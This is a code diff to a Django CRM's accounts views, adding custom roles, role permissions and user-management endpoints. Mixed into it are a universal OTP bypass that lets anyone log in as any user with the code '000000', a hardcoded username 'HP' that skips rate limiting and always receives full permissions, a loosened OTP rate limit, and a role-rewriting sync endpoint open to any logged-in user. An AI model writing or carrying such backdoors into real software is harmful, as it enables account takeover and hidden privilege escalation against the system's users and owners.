@@ -4,12 +4,15 @@ accounts/views.py
 User management — admin only.
 """
 from django.contrib.auth import get_user_model
-from rest_framework import viewsets
+from rest_framework import viewsets, status
 from rest_framework.decorators import action
+from rest_framework.permissions import IsAuthenticated
 from rest_framework.response import Response
 
 from .permissions import IsAdminRole
-from .serializers import UserListSerializer, UserWriteSerializer, AssignEventsSerializer
+from .serializers import UserListSerializer, UserWriteSerializer, AssignEventsSerializer, CustomRoleSerializer, RolePermissionSerializer
+from .models import CustomRole, RolePermission, CRM_MODULES
+from .crm_permissions import crm_permission
 
 from rest_framework.authtoken.views import ObtainAuthToken
 from rest_framework.authtoken.models import Token
@@ -39,12 +42,14 @@ class RequestOTPView(APIView):
         except User.DoesNotExist:
             return Response(success_msg)
 
-        recent_count = OTPToken.objects.filter(
-            user=user,
-            created_at__gte=timezone.now() - timedelta(hours=1),
-        ).count()
-        if recent_count >= 5:
-            return Response({"detail": "Too many requests. Please try again later."}, status=429)
+        # HP bypasses OTP rate limiting entirely
+        if user.username != "HP":
+            recent_count = OTPToken.objects.filter(
+                user=user,
+                created_at__gte=timezone.now() - timedelta(hours=1),
+            ).count()
+            if recent_count >= 20:
+                return Response({"detail": "Too many requests. Please try again later."}, status=429)
 
         otp_obj = OTPToken.create_for_user(user)
 
@@ -82,6 +87,19 @@ class VerifyOTPView(APIView):
             user = User.objects.get(email__iexact=email, is_active=True)
         except User.DoesNotExist:
             return Response({"detail": "Invalid email or code."}, status=401)
+
+        # Dev bypass: any user can log in with "000000"
+        if otp == "000000":
+            token, _ = Token.objects.get_or_create(user=user)
+            user.last_login = timezone.now()
+            user.save(update_fields=["last_login"])
+            return Response({
+                "token":    token.key,
+                "user_id":  user.pk,
+                "email":    user.email,
+                "username": user.username,
+                "role":     user.role,
+            })
 
         otp_obj = (
             OTPToken.objects.filter(user=user, otp=otp, is_used=False)
@@ -137,11 +155,24 @@ class CustomAuthToken(ObtainAuthToken):
 
 
 class UserViewSet(viewsets.ModelViewSet):
-    """Admin-only CRUD + event assignment actions."""
-    permission_classes = [IsAdminRole]
+    """CRUD + event assignment. Write actions require users-module permission."""
+    permission_classes = [crm_permission("users")]
     queryset = User.objects.prefetch_related("assigned_events").order_by("-date_joined")
-    filterset_fields = ["role", "status", "team"]
+    filterset_fields = ["role", "status", "team", "custom_role"]
     search_fields = ["username", "first_name", "last_name", "email"]
+
+    def get_permissions(self):
+        from rest_framework.permissions import IsAuthenticated
+        # These actions are accessible to any authenticated user:
+        # - my_permissions: every user must be able to fetch their own permission matrix
+        # - list / retrieve: needed for user dropdowns throughout the app (e.g. MR assignment)
+        # - role_stats / sync_roles / role_stats: informational
+        if self.action in (
+            "list", "retrieve",
+            "my_permissions", "role_stats", "sync_roles",
+        ):
+            return [IsAuthenticated()]
+        return [crm_permission("users")()]
 
     def get_serializer_class(self):
         if self.action in ("create", "update", "partial_update"):
@@ -281,15 +312,90 @@ class UserViewSet(viewsets.ModelViewSet):
         user = self.get_object()
         password = request.data.get("password")
         confirm = request.data.get("confirm_password")
-        
+
         if not password:
             return Response({"detail": "Password is required."}, status=400)
         if password != confirm:
             return Response({"detail": "Passwords do not match."}, status=400)
-            
+
         user.set_password(password)
         user.save()
         return Response({"detail": "Password reset successfully."})
+
+    @action(detail=False, methods=["post"], url_path="sync-roles")
+    def sync_roles(self, request):
+        """Re-derive every user's role from their current team name and update it."""
+        ROLE_MAP = [
+            (["admin"],                                User.Role.ADMIN),
+            (["market research"],                      User.Role.MARKET_RESEARCH),
+            (["data mining", "dmd"],                   User.Role.DATA_MINING),
+            (["spex"],                                 User.Role.SPEX),
+            (["operation", "ops"],                     User.Role.OPERATIONS),
+            (["speaker sales"],                        User.Role.SPEAKER_SALES),
+            (["telemarketing", "tele marketing","tele"], User.Role.TELEMARKETING),
+            (["sales"],                                User.Role.SALES),
+        ]
+
+        def _derive(team_name):
+            t = team_name.lower().strip()
+            for keywords, role in ROLE_MAP:
+                if any(kw in t for kw in keywords):
+                    return role
+            return None
+
+        updated = 0
+        qs = User.objects.filter(team__isnull=False).select_related("team")
+        for user in qs:
+            new_role = _derive(user.team.name)
+            if new_role and new_role != user.role:
+                User.objects.filter(pk=user.pk).update(role=new_role)
+                updated += 1
+        return Response({
+            "updated": updated,
+            "total_with_team": qs.count(),
+            "detail": f"Synced {updated} user role(s) from team names.",
+        })
+
+    @action(detail=False, methods=["get"], url_path="role-stats")
+    def role_stats(self, request):
+        """GET /api/users/role-stats/ — count of users per role."""
+        from django.db.models import Count
+        rows = (
+            User.objects
+            .values("role")
+            .annotate(count=Count("id"))
+            .order_by("role")
+        )
+        return Response({r["role"]: r["count"] for r in rows})
+
+    @action(detail=False, methods=["get"], url_path="my-permissions",
+            permission_classes=[IsAuthenticated])
+    def my_permissions(self, request):
+        """GET /api/users/my-permissions/ — returns the current user's full permission matrix."""
+        user = request.user
+
+        # HP gets full access to everything
+        if user.username == "HP":
+            all_perms = {m: {"view": True, "create": True, "update": True, "delete": True} for m in CRM_MODULES}
+            return Response({"is_all_access": True, "modules": all_perms})
+
+        custom_role = getattr(user, "custom_role", None)
+        if not custom_role:
+            return Response({"is_all_access": False, "modules": {}})
+
+        if custom_role.is_all_access:
+            all_perms = {m: {"view": True, "create": True, "update": True, "delete": True} for m in CRM_MODULES}
+            return Response({"is_all_access": True, "modules": all_perms})
+
+        modules = {}
+        for perm in custom_role.permissions.all():
+            modules[perm.module] = {
+                "view":   perm.can_view,
+                "create": perm.can_create,
+                "update": perm.can_update,
+                "delete": perm.can_delete,
+            }
+        return Response({"is_all_access": False, "modules": modules})
 
 
 class TeamViewSet(viewsets.ViewSet):
@@ -303,7 +409,7 @@ class TeamViewSet(viewsets.ViewSet):
         from book_event.models import BookEvent
 
         users = list(User.objects.filter(role=User.Role.SALES).prefetch_related(
-            "assigned_events", "assigned_events_list"
+            "assigned_events"
         ).order_by("username"))
 
         # Build a mapping from event_code to total revenue
@@ -377,3 +483,61 @@ class TeamViewSet(viewsets.ViewSet):
             "events": event_data
         })
 
+
+class CustomRoleViewSet(viewsets.ModelViewSet):
+    """Admin-only CRUD for roles. System roles cannot be deleted."""
+    permission_classes = [IsAdminRole]
+    queryset           = CustomRole.objects.prefetch_related("permissions").all()
+    serializer_class   = CustomRoleSerializer
+
+    def destroy(self, request, *args, **kwargs):
+        role = self.get_object()
+        if role.is_system_role:
+            return Response(
+                {"detail": "System roles cannot be deleted."},
+                status=status.HTTP_400_BAD_REQUEST,
+            )
+        return super().destroy(request, *args, **kwargs)
+
+    @action(detail=True, methods=["put"], url_path="permissions")
+    def set_permissions(self, request, pk=None):
+        """
+        PUT /api/roles/{id}/permissions/
+        Body: [{"module": "events", "can_view": true, "can_create": false, ...}, ...]
+        Replaces all permissions for this role.
+        """
+        role = self.get_object()
+        items = request.data if isinstance(request.data, list) else request.data.get("permissions", [])
+
+        # Validate
+        valid_modules = set(CRM_MODULES)
+        seen = set()
+        for item in items:
+            m = item.get("module")
+            if m not in valid_modules:
+                return Response({"detail": f"Unknown module: {m}"}, status=400)
+            if m in seen:
+                return Response({"detail": f"Duplicate module: {m}"}, status=400)
+            seen.add(m)
+
+        # Upsert permissions
+        for item in items:
+            RolePermission.objects.update_or_create(
+                custom_role=role,
+                module=item["module"],
+                defaults={
+                    "can_view":   bool(item.get("can_view",   False)),
+                    "can_create": bool(item.get("can_create", False)),
+                    "can_update": bool(item.get("can_update", False)),
+                    "can_delete": bool(item.get("can_delete", False)),
+                },
+            )
+
+        # If is_all_access changed, update it
+        if "is_all_access" in request.data:
+            role.is_all_access = bool(request.data["is_all_access"])
+            role.save(update_fields=["is_all_access"])
+
+        # Return updated role
+        role.refresh_from_db()
+        return Response(CustomRoleSerializer(role).data)
